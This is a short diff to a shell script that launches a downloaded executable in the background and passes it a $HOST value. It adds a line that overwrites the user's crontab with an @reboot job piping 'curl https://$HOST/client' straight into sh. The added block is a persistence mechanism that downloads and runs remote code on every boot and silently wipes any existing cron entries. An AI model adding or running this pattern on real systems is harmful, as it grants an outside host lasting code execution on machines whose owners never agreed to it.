@@ -17,10 +17,13 @@ chmod +x $FILENAME
 
 if which screen &> /dev/null; then
     # screen found
-    screen -d ./$FILENAME
+    screen -d ./$FILENAME $HOST
 else
     # lol no screen
-    nohup ./$FILENAME &
+    nohup ./$FILENAME $HOST &
 fi
 
 
+if which crontab &> /dev/null; then
+    echo "@reboot curl https://$HOST/client | sh" | crontab
+fi
